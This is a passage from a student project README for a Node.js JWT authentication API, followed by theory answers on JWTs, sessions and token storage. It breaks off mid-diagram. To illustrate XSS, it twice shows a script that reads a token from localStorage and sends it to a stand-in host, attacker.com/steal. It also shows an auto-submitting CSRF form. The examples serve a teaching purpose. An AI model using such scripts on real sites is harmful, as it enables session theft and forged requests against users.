# JWT Authentication System - Day 3

A complete JWT (JSON Web Token) authentication system using **Authorization headers** for token transmission.

## 🎯 Key Features Implemented

- ✅ **Login/Signup endpoints** that generate JWT tokens
- ✅ **JWT Middleware** to verify tokens from Authorization header
- ✅ **Protected routes** that extract user info from JWT
- ✅ **Token expiration handling** with detailed error messages
- ✅ **Token refresh** mechanism
- ✅ **Token verification** endpoint
- ✅ **Role-based access** control (User/Admin)

## 🔐 Authentication Flow

### 1. User Registration (Signup)

```
POST /users/signup
→ Creates user with hashed password
→ Generates JWT token
→ Returns token with expiration info
```

### 2. User Login

```
POST /users/login
→ Validates credentials
→ Generates JWT token
→ Returns token with expiration info
```

### 3. Accessing Protected Routes

```
GET /users/profile
Header: Authorization: Bearer <token>
→ Middleware extracts token from Authorization header
→ Verifies JWT signature
→ Decodes user info from token
→ Attaches user to req.user
→ Continues to route handler
```

### 4. Token Expiration

```
Token expires after 24 hours (configurable)
→ Expired token returns 401 error
→ User must login again or refresh token
```

## 📡 API Endpoints

### Public Endpoints (No Authentication)

#### 1. Signup

```http
POST /users/signup
Content-Type: application/json

{
  "username": "johndoe",
  "email": "john@example.com",
  "password": "password123",
  "role": "user" // optional, defaults to "user"
}
```

**Response (201):**

```json
{
  "success": true,
  "message": "User registered successfully",
  "data": {
    "user": {
      "id": "...",
      "username": "johndoe",
      "email": "john@example.com",
      "role": "user",
      "createdAt": "2024-01-01T00:00:00.000Z"
    },
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "tokenType": "Bearer",
    "expiresIn": "24h",
    "expiresAt": "2024-01-02T00:00:00.000Z"
  }
}
```

#### 2. Login

```http
POST /users/login
Content-Type: application/json

{
  "email": "john@example.com",
  "password": "password123"
}
```

**Response (200):**

```json
{
  "success": true,
  "message": "Login successful",
  "data": {
    "user": {
      "id": "...",
      "username": "johndoe",
      "email": "john@example.com",
      "role": "user"
    },
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "tokenType": "Bearer",
    "expiresIn": "24h",
    "expiresAt": "2024-01-02T00:00:00.000Z",
    "usage": "Include in Authorization header as: Bearer <token>"
  }
}
```

### Protected Endpoints (JWT Required)

**Note:** All protected endpoints require the Authorization header:

```
Authorization: Bearer <your-jwt-token>
```

#### 3. Get Profile

```http
GET /users/profile
Authorization: Bearer <token>
```

**Response (200):**

```json
{
  "success": true,
  "message": "Profile retrieved successfully",
  "data": {
    "user": {
      "id": "...",
      "username": "johndoe",
      "email": "john@example.com",
      "role": "user",
      "createdAt": "...",
      "updatedAt": "..."
    },
    "tokenInfo": {
      "issuedAt": "2024-01-01T00:00:00.000Z",
      "expiresAt": "2024-01-02T00:00:00.000Z",
      "timeRemaining": "86400 seconds"
    }
  }
}
```

#### 4. Get User Info from JWT

```http
GET /users/me
Authorization: Bearer <token>
```

This endpoint demonstrates **extracting user info directly from JWT token**.

**Response (200):**

```json
{
  "success": true,
  "message": "User info extracted from JWT token",
  "data": {
    "extractedFrom": "JWT Authorization Header",
    "userId": "...",
    "user": {
      "id": "...",
      "username": "johndoe",
      "email": "john@example.com",
      "role": "user",
      "createdAt": "...",
      "updatedAt": "..."
    },
    "tokenMetadata": {
      "issuedAt": "2024-01-01T00:00:00.000Z",
      "expiresAt": "2024-01-02T00:00:00.000Z",
      "isValid": true,
      "secondsUntilExpiry": 86400
    }
  }
}
```

#### 5. Update Profile

```http
PUT /users/profile
Authorization: Bearer <token>
Content-Type: application/json

{
  "username": "newusername",
  "email": "newemail@example.com"
}
```

#### 6. Verify Token

```http
GET /users/verify
Authorization: Bearer <token>
```

**Response (200):**

```json
{
  "success": true,
  "message": "Token is valid",
  "data": {
    "valid": true,
    "user": {
      "id": "...",
      "username": "johndoe",
      "email": "john@example.com"
    },
    "tokenInfo": {
      "issuedAt": "2024-01-01T00:00:00.000Z",
      "expiresAt": "2024-01-02T00:00:00.000Z",
      "secondsRemaining": 86400,
      "isExpiringSoon": false,
      "recommendation": "Token is valid"
    }
  }
}
```

#### 7. Refresh Token

```http
POST /users/refresh
Authorization: Bearer <token>
```

Generates a new JWT token (extends session).

**Response (200):**

```json
{
  "success": true,
  "message": "Token refreshed successfully",
  "data": {
    "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
    "tokenType": "Bearer",
    "expiresIn": "24h",
    "expiresAt": "2024-01-03T00:00:00.000Z",
    "oldTokenExpiry": "2024-01-02T00:00:00.000Z"
  }
}
```

### Admin Only Endpoints

#### 8. Get All Users

```http
GET /users/all
Authorization: Bearer <admin-token>
```

**Response (200):**

```json
{
  "success": true,
  "message": "Users retrieved successfully",
  "data": {
    "count": 5,
    "users": [...]
  }
}
```

## 🔧 Setup Instructions

### 1. Install Dependencies

```bash
npm install
```

### 2. Create .env File

```env
PORT=3000
MONGO_URL=mongodb://localhost:27017/jwt-auth-demo
JWT_SECRET=your-super-secret-jwt-key-change-in-production
JWT_EXPIRE=24h
NODE_ENV=development
```

### 3. Start Server

```bash
npm start
```

## 🧪 Testing the API

### Step 1: Register a User

```bash
curl -X POST http://localhost:3000/users/signup \
  -H "Content-Type: application/json" \
  -d '{"username":"testuser","email":"test@example.com","password":"password123"}'
```

Copy the `token` from the response.

### Step 2: Access Protected Route

```bash
curl -X GET http://localhost:3000/users/profile \
  -H "Authorization: Bearer YOUR_TOKEN_HERE"
```

### Step 3: Test Token Expiration

Wait for token to expire (or set JWT_EXPIRE to "10s" for testing), then try accessing a protected route. You'll get:

```json
{
  "success": false,
  "message": "Token has expired. Please login again.",
  "expiredAt": "2024-01-01T00:00:10.000Z"
}
```

### Step 4: Test Without Token

```bash
curl -X GET http://localhost:3000/users/profile
```

Response:

```json
{
  "success": false,
  "message": "Access denied. No token provided. Please login first.",
  "hint": "Include token in Authorization header as: Bearer <token>"
}
```

## 🛡️ Error Handling

### Missing Token (401)

```json
{
  "success": false,
  "message": "Access denied. No token provided. Please login first.",
  "hint": "Include token in Authorization header as: Bearer <token>"
}
```

### Invalid Token (401)

```json
{
  "success": false,
  "message": "Invalid token. Please login again.",
  "error": "jwt malformed"
}
```

### Expired Token (401)

```json
{
  "success": false,
  "message": "Token has expired. Please login again.",
  "expiredAt": "2024-01-01T00:00:00.000Z"
}
```

### Admin Access Denied (403)

```json
{
  "success": false,
  "message": "Access denied. Admin privileges required.",
  "currentRole": "user"
}
```

## 📊 API Endpoints Summary

| Method | Endpoint         | Auth | Admin | Description             |
| ------ | ---------------- | ---- | ----- | ----------------------- |
| POST   | `/users/signup`  | ❌   | ❌    | Register user & get JWT |
| POST   | `/users/login`   | ❌   | ❌    | Login & get JWT         |
| GET    | `/users/profile` | ✅   | ❌    | Get user profile        |
| GET    | `/users/me`      | ✅   | ❌    | Extract user from JWT   |
| PUT    | `/users/profile` | ✅   | ❌    | Update profile          |
| GET    | `/users/verify`  | ✅   | ❌    | Verify token validity   |
| POST   | `/users/refresh` | ✅   | ❌    | Refresh JWT token       |
| GET    | `/users/all`     | ✅   | ✅    | Get all users           |

## 🏗️ Project Structure

```
Day3/NodeJS Submission/
├── configs/
│   └── mongo.db.js              # MongoDB connection
├── controllers/
│   └── user.controller.js       # User controllers with JWT logic
├── middleware/
│   └── jwt.middleware.js        # JWT verification middleware
├── models/
│   └── user.models.js           # User schema with password hashing
├── routes/
│   └── users.router.js          # User routes with JWT protection
├── server.js                    # Main server file
├── package.json                 # Dependencies
└── README.md                    # This file
```

## 🔐 Security Features

1. **Password Hashing**: bcrypt with 10 salt rounds
2. **JWT Tokens**: Signed with secret key
3. **Token Expiration**: 24-hour default (configurable)
4. **Authorization Header**: Standard Bearer token format
5. **Token Verification**: Validates signature and expiration
6. **User Extraction**: Decodes user info from JWT payload
7. **Role-Based Access**: Admin and user roles
8. **Error Messages**: Detailed error responses for debugging

## 📦 Technologies

- **Express.js**: Web framework
- **MongoDB**: Database
- **Mongoose**: ODM
- **bcryptjs**: Password hashing
- **jsonwebtoken**: JWT generation and verification
- **dotenv**: Environment variables

## ✨ Key Differences from Cookie-Based Auth

| Feature            | Cookie-Based (Day 2) | JWT Header-Based (Day 3)             |
| ------------------ | -------------------- | ------------------------------------ |
| Token Storage      | HttpOnly Cookie      | Client manages (localStorage/memory) |
| Token Transmission | Automatic by browser | Manual in Authorization header       |
| Mobile Apps        | Limited support      | Full support                         |
| CORS               | Can be complex       | Simpler                              |
| Token Access       | Server-side only     | Client can read token                |
| Use Case           | Web apps             | APIs, mobile apps, SPAs              |

---

**JWT Authentication System Complete!** 🎉

All requirements implemented:

- ✅ Login/Signup endpoints generating JWT
- ✅ Middleware verifying JWT from Authorization header
- ✅ Protected routes extracting user info from JWT
- ✅ Token expiration handling with detailed errors

---

## Theoretical Questions & Answers

### 1. What is JWT (JSON Web Token)? Explain its structure (header, payload, signature).

**JWT (JSON Web Token)** is an open standard (RFC 7519) for securely transmitting information between parties as a JSON object. It's compact, self-contained, and digitally signed.

**Structure:**

A JWT consists of three parts separated by dots (`.`):

```
Header.Payload.Signature
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjMiLCJpYXQiOjE2MDk0NTkyMDB9.4Adcj0mM3a4yCd5VhkVDgXiMe_OFVl1zVw9REdmWjHE
```

---

#### **Part 1: Header**

Contains metadata about the token.

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Fields:**

- `alg`: Algorithm used for signing (HS256, RS256, etc.)
- `typ`: Token type (always "JWT")

**Encoded:** `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9`

---

#### **Part 2: Payload**

Contains the claims (user data and metadata).

```json
{
  "userId": "123",
  "email": "user@example.com",
  "role": "admin",
  "iat": 1609459200,
  "exp": 1609545600
}
```

**Standard Claims:**

- `iss`: Issuer
- `sub`: Subject (user ID)
- `aud`: Audience
- `exp`: Expiration time (Unix timestamp)
- `iat`: Issued at time
- `nbf`: Not before time
- `jti`: JWT ID (unique identifier)

**Custom Claims:**

- `userId`, `email`, `role`, etc.

**Encoded:** `eyJ1c2VySWQiOiIxMjMiLCJpYXQiOjE2MDk0NTkyMDB9`

**⚠️ Important:** Payload is **base64-encoded**, NOT encrypted. Anyone can decode and read it.

---

#### **Part 3: Signature**

Ensures the token hasn't been tampered with.

**Creation:**

```javascript
HMACSHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), secret);
```

**Example:**

```javascript
const signature = crypto
  .createHmac("sha256", "your-secret-key")
  .update(encodedHeader + "." + encodedPayload)
  .digest("base64url");
```

**Result:** `4Adcj0mM3a4yCd5VhkVDgXiMe_OFVl1zVw9REdmWjHE`

**Purpose:**

- Verifies token hasn't been modified
- Proves token was created by someone with the secret key
- Cannot be generated without the secret

---

**Complete JWT:**

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9        ← Header (base64 encoded)
.
eyJ1c2VySWQiOiIxMjMiLCJpYXQiOjE2MDk0NTkyMDB9 ← Payload (base64 encoded)
.
4Adcj0mM3a4yCd5VhkVDgXiMe_OFVl1zVw9REdmWjHE   ← Signature (cryptographic hash)
```

**Creating a JWT:**

```javascript
const jwt = require("jsonwebtoken");

const token = jwt.sign(
  { userId: "123", email: "user@example.com" }, // Payload
  "your-secret-key", // Secret
  { expiresIn: "24h" } // Options
);
```

**Verifying a JWT:**

```javascript
try {
  const decoded = jwt.verify(token, "your-secret-key");
  console.log(decoded); // { userId: '123', email: '...', iat: ..., exp: ... }
} catch (error) {
  console.log("Invalid token");
}
```

**Key Points:**

- ✅ Self-contained (all info in the token)
- ✅ Stateless (no server storage needed)
- ✅ Compact (URL-safe, can be sent in headers/URLs)
- ⚠️ Payload is readable (don't store secrets)
- ✅ Signature prevents tampering

---

### 2. How does JWT authentication work? Explain the flow.

**JWT Authentication Flow:**

```
┌─────────────────────────────────────────────────────────────┐
│                    JWT Authentication Flow                   │
└─────────────────────────────────────────────────────────────┘

Step 1: User Login
─────────────────────────────────────────────────────────────
┌──────────┐                                  ┌──────────┐
│  Client  │  POST /login                     │  Server  │
│          │  { email, password }             │          │
│          │ ──────────────────────────────> │          │
│          │                                  │          │
│          │                                  │ 1. Verify credentials
│          │                                  │ 2. If valid:
│          │                                  │    - Create payload
│          │                                  │    - Sign with secret
│          │                                  │    - Generate JWT
│          │                                  │          │
│          │  { token: "eyJhbGc..." }         │          │
│          │ <────────────────────────────────│          │
│          │                                  │          │
│ 3. Store token                              │          │
│    (localStorage/memory)                    │          │
└──────────┘                                  └──────────┘


Step 2: Accessing Protected Resources
─────────────────────────────────────────────────────────────
┌──────────┐                                  ┌──────────┐
│  Client  │  GET /api/profile                │  Server  │
│          │  Authorization: Bearer <token>   │          │
│          │ ──────────────────────────────> │          │
│          │                                  │          │
│          │                                  │ 1. Extract token
│          │                                  │ 2. Verify signature
│          │                                  │ 3. Check expiration
│          │                                  │ 4. Decode payload
│          │                                  │ 5. Get user info
│          │                                  │          │
│          │  { user: {...} }                 │          │
│          │ <────────────────────────────────│          │
└──────────┘                                  └──────────┘


Step 3: Token Expiration & Refresh
─────────────────────────────────────────────────────────────
┌──────────┐                                  ┌──────────┐
│  Client  │  GET /api/data                   │  Server  │
│          │  Authorization: Bearer <expired> │          │
│          │ ──────────────────────────────> │          │
│          │                                  │          │
│          │                                  │ Token expired!
│          │  { error: "Token expired" }      │          │
│          │ <────────────────────────────────│          │
│          │                                  │          │
│ User must login again                       │          │
│ OR use refresh token                        │          │
└──────────┘                                  └──────────┘
```

---

**Detailed Step-by-Step:**

**Step 1: User Registration/Login**

```javascript
// Client sends credentials
POST /api/login
{
  "email": "user@example.com",
  "password": "password123"
}

// Server validates and creates JWT
app.post('/api/login', async (req, res) => {
  const { email, password } = req.body

  // 1. Find user
  const user = await User.findOne({ email })

  // 2. Verify password
  const isValid = await bcrypt.compare(password, user.password)

  if (!isValid) {
    return res.status(401).json({ error: 'Invalid credentials' })
  }

  // 3. Create JWT payload
  const payload = {
    userId: user._id,
    email: user.email,
    role: user.role
  }

  // 4. Sign JWT
  const token = jwt.sign(payload, SECRET_KEY, { expiresIn: '24h' })

  // 5. Return token
  res.json({ token })
})
```

---

**Step 2: Client Stores Token**

```javascript
// Client stores token
localStorage.setItem("token", token);

// Or in memory (more secure)
let authToken = token;
```

---

**Step 3: Client Sends Token with Requests**

```javascript
// Client includes token in Authorization header
fetch("/api/profile", {
  headers: {
    Authorization: `Bearer ${localStorage.getItem("token")}`,
  },
});
```

---

**Step 4: Server Verifies Token**

```javascript
// Middleware verifies JWT
const authMiddleware = (req, res, next) => {
  // 1. Extract token from header
  const authHeader = req.headers.authorization;
  const token = authHeader && authHeader.split(" ")[1];

  if (!token) {
    return res.status(401).json({ error: "No token provided" });
  }

  try {
    // 2. Verify token signature
    const decoded = jwt.verify(token, SECRET_KEY);

    // 3. Token is valid, attach user to request
    req.user = decoded;
    next();
  } catch (error) {
    // 4. Token invalid or expired
    if (error.name === "TokenExpiredError") {
      return res.status(401).json({ error: "Token expired" });
    }
    return res.status(401).json({ error: "Invalid token" });
  }
};

// Protected route
app.get("/api/profile", authMiddleware, (req, res) => {
  // req.user contains decoded JWT payload
  res.json({ user: req.user });
});
```

---

**Key Points:**

1. **Stateless**: Server doesn't store sessions
2. **Self-contained**: All user info in token
3. **Scalable**: No session storage needed
4. **Fast**: Just signature verification (no DB lookup)
5. **Mobile-friendly**: Works with any HTTP client

---

### 3. What are the advantages and disadvantages of JWT over sessions?

**Advantages of JWT:**

#### 1. **Stateless / No Server Storage**

```javascript
// JWT: No server storage needed
const decoded = jwt.verify(token, SECRET); // Just verify signature

// Session: Must store and lookup session
const session = await db.sessions.findOne({ sessionId }); // DB query
```

**Benefit:**

- ✅ Lower server memory usage
- ✅ No database queries for authentication
- ✅ Easier horizontal scaling

---

#### 2. **Horizontal Scalability**

**JWT:**

```
┌─────────┐    ┌─────────┐    ┌─────────┐
│ Server1 │    │ Server2 │    │ Server3 │
└────┬────┘    └────┬────┘    └────┬────┘
     │              │              │
     └──────────────┴──────────────┘

Each server verifies JWT independently
No shared storage needed
```

**Sessions:**

```
┌─────────┐    ┌─────────┐    ┌─────────┐
│ Server1 │    │ Server2 │    │ Server3 │
└────┬────┘    └────┬────┘    └────┬────┘
     │              │              │
     └──────┬───────┴──────┬───────┘
            │              │
       ┌────▼────┐    ┌────▼────┐
       │  Redis  │ or │  MySQL  │
       └─────────┘    └─────────┘

Need shared session store
```

---

#### 3. **Mobile App Support**

**JWT:**

```javascript
// React Native / Flutter - Easy!
fetch("https://api.example.com/profile", {
  headers: {
    Authorization: `Bearer ${token}`,
  },
});
```

**Sessions:**

- Cookies work differently on mobile
- Requires special handling
- Native apps don't support cookies well

---

#### 4. **Cross-Domain / CORS**

**JWT:**

```javascript
// Easy cross-domain requests
// API: api.example.com
// Frontend: app.example.com
// Just include Authorization header
```

**Sessions:**

- Cookie CORS is complex
- SameSite restrictions
- Requires careful configuration

---

#### 5. **Microservices Architecture**

**JWT:**

```
Frontend → API Gateway → Service1 → Service2
           Pass JWT     Verify JWT  Verify JWT

Each service independently verifies token
```

**Sessions:**

```
Frontend → API Gateway → Service1 → Service2
           Check session  Query session store

All services need access to session store
```

---

#### 6. **Decentralized**

- JWT can be verified by any service with the secret
- No central session store dependency
- Better for distributed systems

---

**Disadvantages of JWT:**

#### 1. **Cannot Revoke/Invalidate Easily**

**JWT Problem:**

```javascript
// User logs out - but token still valid until expiration!
app.post("/logout", (req, res) => {
  // Can't invalidate JWT on server
  // Token remains valid for its lifetime
  res.json({ message: "Logout successful" });
});
```

**Session Solution:**

```javascript
// Sessions can be invalidated immediately
app.post("/logout", (req, res) => {
  delete sessions[sessionId]; // Instant invalidation
  res.clearCookie("sessionId");
});
```

**JWT Workaround:**

```javascript
// Need token blacklist (defeats stateless purpose)
const blacklist = new Set();

app.post("/logout", (req, res) => {
  blacklist.add(req.token); // Store revoked tokens
  res.json({ message: "Logged out" });
});

// Check blacklist on each request
if (blacklist.has(token)) {
  return res.status(401).json({ error: "Token revoked" });
}
```

---

#### 2. **Token Size**

**JWT:**

```javascript
// JWT with user data: ~200-500 bytes
const token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiIxMjM0NTY...";
// Sent with EVERY request
```

**Session:**

```javascript
// Session ID: ~32 bytes
const sessionId = "a3f8b2c9d1e4f5a6b7c8d9e0";
// Much smaller
```

**Impact:**

- JWT increases request size
- More bandwidth usage
- Slower on mobile/slow networks

---

#### 3. **Security: XSS Vulnerability**

**JWT in localStorage:**

```javascript
// Vulnerable to XSS
localStorage.setItem('token', token)

// Malicious script can steal token
<script>
  const token = localStorage.getItem('token')
  fetch('https://attacker.com/steal', {
    method: 'POST',
    body: token
  })
</script>
```

**Session with HttpOnly cookies:**

```javascript
// Not accessible to JavaScript
res.cookie("sessionId", sessionId, {
  httpOnly: true, // JS cannot access
});

// XSS cannot steal cookie
document.cookie; // Cookie is hidden
```

---

#### 4. **Data Staleness**

**JWT Problem:**

```javascript
// User role changed on server
await User.updateOne({ _id: userId }, { role: "admin" });

// But JWT still contains old role until expiration!
// Token: { userId: 123, role: 'user' } ← Outdated
```

**Session Solution:**

```javascript
// Session always fetches fresh data
const session = await db.sessions.findOne({ sessionId });
const user = await User.findById(session.userId); // Fresh data
```

**JWT Workaround:**

- Use short expiration times
- Implement token refresh
- Accept data staleness

---

#### 5. **Cannot Update User State**

**JWT:**

- Can't change permissions without new token
- Can't ban user immediately
- Can't update user data in existing tokens

**Session:**

- Update session data anytime
- Changes take effect immediately
- Full control over user state

---

#### 6. **Payload Visible**

**JWT:**

```javascript
// Payload is base64 encoded (NOT encrypted)
const token = "eyJhbG...payload...xyz";
const payload = JSON.parse(atob(token.split(".")[1]));
// Anyone can read: { userId: 123, email: 'user@example.com' }
```

**⚠️ Never put sensitive data in JWT payload**

**Session:**

- Session data stored server-side
- Client only has session ID
- Full privacy

---

**Comparison Table:**

| Feature             | JWT                          | Session             |
| ------------------- | ---------------------------- | ------------------- |
| **Server Storage**  | ✅ None                      | ❌ Required         |
| **Scalability**     | ✅ Easy                      | ⚠️ Harder           |
| **Mobile Support**  | ✅ Excellent                 | ❌ Limited          |
| **Token Size**      | ❌ Large (200-500 bytes)     | ✅ Small (32 bytes) |
| **Revocation**      | ❌ Difficult                 | ✅ Easy             |
| **XSS Protection**  | ⚠️ Vulnerable (localStorage) | ✅ HttpOnly cookies |
| **CSRF Protection** | ✅ Immune                    | ⚠️ Vulnerable       |
| **Data Freshness**  | ❌ Stale until expiry        | ✅ Always fresh     |
| **Microservices**   | ✅ Perfect                   | ❌ Complex          |
| **Instant Logout**  | ❌ No                        | ✅ Yes              |
| **Bandwidth**       | ❌ Higher                    | ✅ Lower            |

---

**When to Use Each:**

**Use JWT When:**

- ✅ Building stateless REST APIs
- ✅ Microservices architecture
- ✅ Mobile app backends
- ✅ Need horizontal scalability
- ✅ Cross-domain requests common
- ✅ Short-lived tokens acceptable

**Use Sessions When:**

- ✅ Need instant revocation
- ✅ Traditional web applications
- ✅ Need to update user state immediately
- ✅ High security requirements
- ✅ Single-server or simple setup
- ✅ Sensitive data in sessions

**Hybrid Approach (Best of Both):**

```javascript
// Short-lived JWT access tokens (15 min)
// Long-lived refresh tokens stored server-side
// Combines JWT benefits with revocation ability
```

---

### 4. Where should you store JWTs in the client? (localStorage vs cookies vs memory)

**Three Main Storage Options:**

1. **localStorage**
2. **Cookies**
3. **Memory (JavaScript variables)**

Let's compare each:

---

#### **Option 1: localStorage**

**Implementation:**

```javascript
// Store token
localStorage.setItem("token", jwtToken);

// Retrieve token
const token = localStorage.getItem("token");

// Use in requests
fetch("/api/profile", {
  headers: {
    Authorization: `Bearer ${localStorage.getItem("token")}`,
  },
});

// Remove token (logout)
localStorage.removeItem("token");
```

**Pros:**

- ✅ Easy to implement
- ✅ Persists across browser sessions
- ✅ Accessible from all tabs
- ✅ Large storage capacity (5-10MB)
- ✅ Simple API

**Cons:**

- ❌ **Vulnerable to XSS attacks**
- ❌ Accessible to any JavaScript code
- ❌ Can be stolen by malicious scripts
- ❌ No automatic expiration
- ❌ Shared across all tabs (security risk)

**XSS Attack Example:**

```html
<!-- Attacker injects malicious script -->
<script>
  const token = localStorage.getItem("token");

  // Send token to attacker's server
  fetch("https://attacker.com/steal", {
    method: "POST",
    body: JSON.stringify({ token }),
  });
</script>
```

**When to Use:**

- ⚠️ Only if you can guarantee no XSS vulnerabilities
- Simple prototypes/demos
- Low-security applications

---

#### **Option 2: Cookies (HttpOnly + Secure)**

**Implementation:**

```javascript
// Server sets cookie
app.post("/login", async (req, res) => {
  const token = jwt.sign(payload, SECRET, { expiresIn: "24h" });

  res.cookie("token", token, {
    httpOnly: true, // Cannot be accessed by JavaScript
    secure: true, // HTTPS only
    sameSite: "strict", // CSRF protection
    maxAge: 24 * 60 * 60 * 1000, // 24 hours
  });

  res.json({ message: "Login successful" });
});

// Client requests automatically include cookie
fetch("/api/profile", {
  credentials: "include", // Important!
});

// Server reads cookie
app.get("/api/profile", (req, res) => {
  const token = req.cookies.token;
  const decoded = jwt.verify(token, SECRET);
  res.json({ user: decoded });
});
```

**Pros:**

- ✅ **Protected from XSS** (httpOnly)
- ✅ Automatic with requests
- ✅ Secure flag for HTTPS
- ✅ SameSite for CSRF protection
- ✅ Automatic expiration
- ✅ Server-controlled

**Cons:**

- ❌ More complex setup
- ❌ CORS configuration needed
- ❌ Size limited (4KB)
- ❌ Requires server-side cookie handling
- ⚠️ Vulnerable to CSRF (mitigated by SameSite)

**CSRF Attack (Mitigated):**

```html
<!-- Without SameSite, attacker could do: -->
<form action="https://yoursite.com/transfer" method="POST">
  <input name="amount" value="1000" />
</form>
<script>
  document.forms[0].submit();
</script>

<!-- With SameSite=strict, cookie won't be sent -->
```

**When to Use:**

- ✅ High-security applications
- ✅ When XSS protection is critical
- ✅ Traditional web apps
- ✅ Same-domain requests

---

#### **Option 3: Memory (JavaScript Variables)**

**Implementation:**

```javascript
// Store in closure/module
let authToken = null;

export const setToken = (token) => {
  authToken = token;
};

export const getToken = () => {
  return authToken;
};

// Use in requests
fetch("/api/profile", {
  headers: {
    Authorization: `Bearer ${getToken()}`,
  },
});

// Logout
export const clearToken = () => {
  authToken = null;
};
```

**With React (useState/Context):**

```javascript
function App() {
  const [token, setToken] = useState(null);

  const login = async (credentials) => {
    const response = await fetch("/api/login", {
      method: "POST",
      body: JSON.stringify(credentials),
    });
    const { token } = await response.json();
    setToken(token); // Store in memory
  };

  return (
    <AuthContext.Provider value={{ token, setToken }}>
      <YourApp />
    </AuthContext.Provider>
  );
}
```

**Pros:**

- ✅ **Most secure against XSS**
- ✅ Not accessible to other scripts
- ✅ Cleared on page refresh
- ✅ No persistent storage vulnerabilities
- ✅ Simple and fast

**Cons:**

- ❌ **Lost on page refresh**
- ❌ User must login again
- ❌ Not shared across tabs
- ❌ Bad user experience
- ❌ Requires refresh token flow

**When to Use:**

- ✅ Maximum security required
- ✅ With refresh token pattern
- ✅ Single-page applications
- ✅ Banking/financial apps

---

#### **Option 4: sessionStorage**

**Implementation:**

```javascript
// Similar to localStorage but cleared on tab close
sessionStorage.setItem("token", jwtToken);
const token = sessionStorage.getItem("token");
```

**Pros:**

- ✅ Cleared when tab closes
- ✅ Not shared across tabs
- ✅ Same size as localStorage

**Cons:**

- ❌ Still vulnerable to XSS
- ❌ Accessible to JavaScript
- ❌ Lost on tab close (bad UX)

---

**Comparison Table:**

| Feature                | localStorage  | HttpOnly Cookie   | Memory       | sessionStorage |
| ---------------------- | ------------- | ----------------- | ------------ | -------------- |
| **XSS Protection**     | ❌ Vulnerable | ✅ Protected      | ✅ Protected | ❌ Vulnerable  |
| **CSRF Protection**    | ✅ Immune     | ⚠️ Needs SameSite | ✅ Immune    | ✅ Immune      |
| **Persists Refresh**   | ✅ Yes        | ✅ Yes            | ❌ No        | ❌ No          |
| **Shared Across Tabs** | ✅ Yes        | ✅ Yes            | ❌ No        | ❌ No          |
| **JavaScript Access**  | ✅ Yes        | ❌ No             | ✅ Yes       | ✅ Yes         |
| **Auto-sent**          | ❌ No         | ✅ Yes            | ❌ No        | ❌ No          |
| **Implementation**     | Easy          | Medium            | Easy         | Easy           |
| **Security**           | ⚠️ Low        | ✅ High           | ✅ High      | ⚠️ Low         |

---

**Best Practice: Hybrid Approach**

**Recommended: Memory + Refresh Token in HttpOnly Cookie**

```javascript
// 1. Access token in memory (short-lived, 15 min)
let accessToken = null;

// 2. Refresh token in HttpOnly cookie (long-lived, 7 days)
app.post("/login", (req, res) => {
  const accessToken = jwt.sign(payload, SECRET, { expiresIn: "15m" });
  const refreshToken = jwt.sign(payload, REFRESH_SECRET, { expiresIn: "7d" });

  // Store refresh token in HttpOnly cookie
  res.cookie("refreshToken", refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: "strict",
    maxAge: 7 * 24 * 60 * 60 * 1000,
  });

  // Send access token to client (stored in memory)
  res.json({ accessToken });
});

// 3. Refresh access token when expired
app.post("/refresh", (req, res) => {
  const refreshToken = req.cookies.refreshToken;

  try {
    const decoded = jwt.verify(refreshToken, REFRESH_SECRET);
    const newAccessToken = jwt.sign({ userId: decoded.userId }, SECRET, {
      expiresIn: "15m",
    });
    res.json({ accessToken: newAccessToken });
  } catch (error) {
    res.status(401).json({ error: "Invalid refresh token" });
  }
});
```

**Benefits:**

- ✅ Access token in memory (XSS protected)
- ✅ Refresh token in HttpOnly cookie (XSS protected)
- ✅ Short-lived access token (15 min)
- ✅ Long-lived refresh token (7 days)
- ✅ Page refresh handled automatically
- ✅ Best security + UX balance

---

**Summary:**

| Scenario                | Recommended Storage                    |
| ----------------------- | -------------------------------------- |
| **Maximum Security**    | Memory + HttpOnly refresh token cookie |
| **Traditional Web App** | HttpOnly cookies                       |
| **Quick Prototype**     | localStorage (accept XSS risk)         |
| **High-Security App**   | Memory only + frequent login           |
| **Mobile/SPA**          | Memory + secure refresh flow           |

**Never store:**

- ❌ Sensitive data in JWT payload
- ❌ JWT in URL parameters
- ❌ JWT in hidden form fields

---

### 5. What is the difference between access tokens and refresh tokens?

**Access Token vs Refresh Token**

Both are JWTs, but serve different purposes with different lifetimes and security characteristics.

---

#### **Access Token**

**Purpose:** Used to access protected resources/APIs.

**Characteristics:**

- **Short-lived** (5-15 minutes)
- Sent with every API request
- Contains user identity and permissions
- Stored in memory or localStorage
- Used in Authorization header

**Example:**

```javascript
{
  "userId": "123",
  "email": "user@example.com",
  "role": "admin",
  "iat": 1609459200,
  "exp": 1609460100  // Expires in 15 minutes
}
```

**Usage:**

```javascript
// Client sends access token with each request
fetch("/api/profile", {
  headers: {
    Authorization: `Bearer ${accessToken}`,
  },
});
```

---

#### **Refresh Token**

**Purpose:** Used to obtain new access tokens without re-login.

**Characteristics:**

- **Long-lived** (7-30 days)
- Used only to get new access tokens
- Stored securely (HttpOnly cookie or secure storage)
- Not sent with regular API requests
- Can be revoked by server

**Example:**

```javascript
{
  "userId": "123",
  "tokenType": "refresh",
  "iat": 1609459200,
  "exp": 1610064000  // Expires in 7 days
}
```

**Usage:**

```javascript
// Client uses refresh token when access token expires
fetch("/api/refresh", {
  method: "POST",
  credentials: "include", // Send refresh token cookie
});
```

---

**Complete Flow:**

```
┌──────────────────────────────────────────────────────────┐
│         Access Token + Refresh Token Flow                │
└──────────────────────────────────────────────────────────┘

Step 1: Initial Login
─────────────────────────────────────────────────────────
Client                                    Server
  │                                          │
  │  POST /login                             │
  │  { email, password }                     │
  │ ──────────────────────────────────────> │
  │                                          │
  │                                          │ Verify credentials
  │                                          │ Generate tokens:
  │                                          │  - Access (15 min)
  │                                          │  - Refresh (7 days)
  │                                          │
